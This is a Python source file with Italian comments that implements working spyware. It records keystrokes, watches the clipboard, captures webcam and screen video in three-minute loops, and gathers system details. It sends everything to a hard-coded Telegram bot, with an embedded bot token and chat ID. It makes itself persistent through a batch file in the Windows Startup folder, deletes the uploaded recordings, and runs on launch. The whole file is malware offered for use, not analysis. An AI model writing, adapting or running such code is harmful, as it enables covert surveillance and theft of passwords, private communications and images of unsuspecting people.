import os
import platform
import socket
import threading
import time
import tempfile
import cv2
import imageio
import requests
from datetime import datetime
from pynput import keyboard
import pyperclip
import mss  # Per screen recording
import numpy as np  # Per manipolazione array immagine

BOT_TOKEN = '7943910313:AAGwlycYnqGOqPdiYKEP75BZV1mZbF3AikA'
CHAT_ID = '1060806638'
SEND_REPORT_EVERY = 180  # 3 minuti per keylogger
VIDEO_DURATION = 180  # 3 minuti per video

log = ""
key_count = 0
session_start_time = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
previous_system_info = {}

def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    data = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
    requests.post(url, data=data)

def send_telegram_file(file_path):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument'
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': CHAT_ID}
        requests.post(url, files=files, data=data)

def get_system_info():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    system = platform.system()
    machine = platform.machine()
    processor = platform.processor()
    
    return {
        "hostname": hostname,
        "ip_address": ip_address,
        "system": system,
        "machine": machine,
        "processor": processor
    }

def save_key(key):
    global log, key_count
    try:
        if key == keyboard.Key.enter:
            log += "\n"  # Fix per andare a capo
        elif key.char:
            log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.backspace:
            log = log[:-1]
    key_count += 1
    print(f"[LOG] Tasto premuto: {key}")

def monitor_clipboard():
    previous_clipboard = pyperclip.paste() # Inizializza con il contenuto attuale
    while True:
        current_clipboard = pyperclip.paste()
        if current_clipboard and current_clipboard != previous_clipboard:
            send_telegram_message(f"\U0001F4CB *Testo copiato:* {current_clipboard}")
            print(f"[LOG] Testo copiato: {current_clipboard}")
            previous_clipboard = current_clipboard
        time.sleep(1)

def report():
    global log, key_count, previous_system_info
    system_info = get_system_info()
    
    if system_info != previous_system_info:
        info_message = (f"\U0001F4BB *PC Info:*\n"
                        f"Hostname: {system_info['hostname']}\n"
                        f"IP: {system_info['ip_address']}\n"
                        f"Sistema: {system_info['system']}\n")
        send_telegram_message(info_message)
        previous_system_info = system_info
    
    if log:
        timestamp = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
        message = (f"\U0001F4DD *SESSIONE INIZIATA:* {session_start_time}\n"
                   f"\U0001F510 *LOG DELLE KEY PREMUTE*\n"
                   f"Ultimo aggiornamento: {timestamp}\n"
                   f"Tasti premuti: {key_count}\n"
                   f"Log:\n{log}")
        send_telegram_message(message)
        log = ""
    
    print(f"[LOG] Report inviato. Prossimo invio tra {SEND_REPORT_EVERY}s")
    threading.Timer(SEND_REPORT_EVERY, report).start()

def add_to_startup():
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Start Menu\Programs\Startup')
    script_path = os.path.abspath(__file__)
    startup_script = os.path.join(startup_path, "system_logger.bat")
    
    with open(startup_script, "w") as bat_file:
        bat_file.write(f"@echo off\npython \"{script_path}\"\nexit")
    print("[LOG] Aggiunto ai programmi di avvio.")

def record_video():
    print("[LOG] Inizio registrazione video per 3 minuti...")
    timestamp_video = datetime.now().strftime('%d-%m-%y_%H-%M')
    video_filename = os.path.join(tempfile.gettempdir(), f"recording_{timestamp_video}.mp4")
    
    camera = None
    writer = None
    success = False

    try:
        camera = cv2.VideoCapture(0)
        if not camera.isOpened():
            print("[LOG] Errore: impossibile accedere alla webcam.")
        else:
            fps = 30  # Frames per second
            # Non è necessario specificare width/height, imageio li deduce dal primo frame

            writer = imageio.get_writer(
                video_filename,
                fps=fps,
                codec='libx264',
                format='ffmpeg',
                pixelformat='yuv420p',  # Aggiunto per maggiore compatibilità MP4
                macro_block_size=None  # Evita resize automatico
            )

            frame_count = 0
            max_frames = VIDEO_DURATION * fps
            next_frame_time = time.time()

            while frame_count < max_frames:
                ret, frame = camera.read()
                if not ret:
                    print("[LOG] Errore: impossibile leggere frame dalla webcam.")
                    break  # Esce dal loop di registrazione
                
                frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB) # imageio si aspetta RGB
                writer.append_data(frame_rgb)
                frame_count += 1
                
                # Sincronizzazione per mantenere FPS
                next_frame_time += (1 / fps)
                sleep_duration = next_frame_time - time.time()
                if sleep_duration > 0:
                    time.sleep(sleep_duration)
            
            if frame_count >= max_frames: # Considera successo se ha registrato tutti i frame
                success = True
    except Exception as e:
        print(f"[LOG] Errore durante la registrazione: {e}")
        success = False
    finally:
        if writer is not None:
            try:
                writer.close()
                if success:
                    print(f"[LOG] Registrazione video completata e file chiuso: {video_filename}")
                else:
                    print(f"[LOG] Writer video chiuso dopo errore o interruzione.")
            except Exception as e_close:
                print(f"[LOG] Errore durante la chiusura del writer video: {e_close}")
        
        if camera is not None and camera.isOpened():
            camera.release()

    if success and os.path.exists(video_filename):
        threading.Thread(target=lambda: send_and_delete(video_filename)).start()
    elif success and not os.path.exists(video_filename):
         print(f"[LOG] File video non trovato dopo registrazione (success=true): {video_filename}")
    elif not success:
        print(f"[LOG] Registrazione video fallita o interrotta, file non inviato.")
    
    # Riavvia la registrazione video in un nuovo thread
    threading.Thread(target=record_video).start()

def record_screen():
    print("[LOG] Inizio registrazione schermo per 3 minuti...")
    timestamp_screen = datetime.now().strftime('%d-%m-%y_%H-%M')
    screen_video_filename = os.path.join(tempfile.gettempdir(), f"screen_recording_{timestamp_screen}.mp4")
    
    screen_fps = 10  # FPS per lo screen recording, può essere più basso per ridurre il carico
    max_screen_frames = VIDEO_DURATION * screen_fps
    writer = None
    success = False

    try:
        with mss.mss() as sct:
            # monitor[0] è l'intero desktop virtuale, monitor[1] è il primario
            monitor = sct.monitors[1] 
            
            writer = imageio.get_writer(
                screen_video_filename,
                fps=screen_fps,
                codec='libx264',
                format='ffmpeg',
                pixelformat='yuv420p',  # Aggiunto per maggiore compatibilità MP4
                macro_block_size=None
            )

            frame_count = 0
            next_frame_time = time.time()

            while frame_count < max_screen_frames:
                sct_img = sct.grab(monitor) # Cattura lo schermo
                
                # Converte l'immagine da BGRA (formato mss) a RGB per imageio
                frame = np.array(sct_img)
                frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGRA2RGB)
                
                writer.append_data(frame_rgb)
                frame_count += 1
                
                # Sincronizzazione per mantenere FPS
                next_frame_time += (1 / screen_fps)
                sleep_duration = next_frame_time - time.time()
                if sleep_duration > 0:
                    time.sleep(sleep_duration)
        
        success = True # Se il blocco 'with mss.mss()' e il loop completano

    except Exception as e:
        print(f"[LOG] Errore durante la registrazione dello schermo: {e}")
        success = False
    finally:
        if writer is not None:
            try:
                writer.close()
                if success:
                     print(f"[LOG] Registrazione schermo completata e file chiuso: {screen_video_filename}")
                else:
                     print(f"[LOG] Writer dello schermo chiuso dopo errore.")
            except Exception as e_close:
                print(f"[LOG] Errore durante la chiusura del writer per lo schermo: {e_close}")

    if success and os.path.exists(screen_video_filename):
        threading.Thread(target=lambda: send_and_delete(screen_video_filename)).start()
    elif success and not os.path.exists(screen_video_filename):
        print(f"[LOG] File screen recording non trovato dopo registrazione (success=true): {screen_video_filename}")
    elif not success:
        print(f"[LOG] Registrazione schermo fallita, file non inviato.")

    # Riavvia la registrazione dello schermo in un nuovo thread
    threading.Thread(target=record_screen).start()

def send_and_delete(path):
    print(f"[LOG] Tentativo di invio file: {path}")
    send_telegram_file(path)
    try:
        os.remove(path)
        print(f"[LOG] File {path} inviato ed eliminato.")
    except Exception as e:
        print(f"[LOG] Errore durante l'eliminazione del file {path}: {e}")
        pass

def start_keylogger():
    add_to_startup()
    listener = keyboard.Listener(on_press=save_key)
    clipboard_thread = threading.Thread(target=monitor_clipboard)
    clipboard_thread.daemon = True # Il thread termina se il programma principale esce
    clipboard_thread.start()
    print("[LOG] Keylogger avviato.")
    report() # Avvia il report dei log testuali
    
    # Avvia la registrazione video dalla webcam in un thread
    video_thread = threading.Thread(target=record_video)
    video_thread.daemon = True
    video_thread.start()
    
    # Avvia la registrazione dello schermo in un thread
    screen_record_thread = threading.Thread(target=record_screen)
    screen_record_thread.daemon = True
    screen_record_thread.start()
    
    with listener:
        listener.join()

start_keylogger()
